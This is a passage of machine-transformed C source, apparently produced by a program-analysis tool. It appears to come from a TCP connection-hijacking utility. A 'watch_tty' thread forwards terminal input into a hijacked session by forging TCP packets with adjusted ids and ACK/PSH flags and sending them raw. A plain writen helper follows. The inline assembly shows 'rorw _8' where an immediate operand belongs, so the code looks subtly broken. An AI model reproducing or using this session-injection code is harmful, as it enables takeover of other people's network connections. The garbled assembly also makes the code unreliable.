      tmp_if_expr_5 = (signed int)wtd->ci->src.window;

    else
    {
      unsigned short int __v;
      unsigned short int __x = (unsigned short int)242;
      asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
      tmp_statement_expression_4 = __v;
      tmp_if_expr_5 = (signed int)tmp_statement_expression_4;
    }
    ts.window = (unsigned short int)tmp_if_expr_5;
    unsigned short int watch_tty__1__1__3____v;
    unsigned short int watch_tty__1__1__3____x;
    unsigned short int watch_tty__1__1__3__1____v;
    unsigned short int watch_tty__1__1__3__1____x = (unsigned short int)wtd->ci->src.id;
    asm("rorw _8, %w0" : "=r"(watch_tty__1__1__3__1____v) : "0"(watch_tty__1__1__3__1____x) : "cc");
    tmp_statement_expression_7 = watch_tty__1__1__3__1____v;
    watch_tty__1__1__3____x = (unsigned short int)((signed int)tmp_statement_expression_7 + 1);
    asm("rorw _8, %w0" : "=r"(watch_tty__1__1__3____v) : "0"(watch_tty__1__1__3____x) : "cc");
    tmp_statement_expression_6 = watch_tty__1__1__3____v;
    ts.id = tmp_statement_expression_6;
    ts.ack = 1;
    ts.psh = 1;
    ts.rst = 0;
    ts.data = buf;
    ts.data_len = nr;
    send_tcp_packet(&ts);
  }
  while((_Bool)1);
  if(wtd->input_mode == 0)
    tty_reset(0);

  list_produce_done(&l_hijack_conn);
  return (void *)0;
}

// writen
// file util.c line 374
signed int writen(signed int fd, char *ptr, signed int nbytes)
{
  signed int nleft;
  signed int nwritten;
  nleft = nbytes;
  while(nleft >= 1)
  {
    signed long int return_value_write_1;
    return_value_write_1=write(fd, (const void *)ptr, (unsigned long int)nleft);
    nwritten = (signed int)return_value_write_1;
    if(!(nwritten >= 1))
      return nwritten;

    nleft = nleft - nwritten;
    ptr = ptr + (signed long int)nwritten;
  }
  return nbytes - nleft;
}

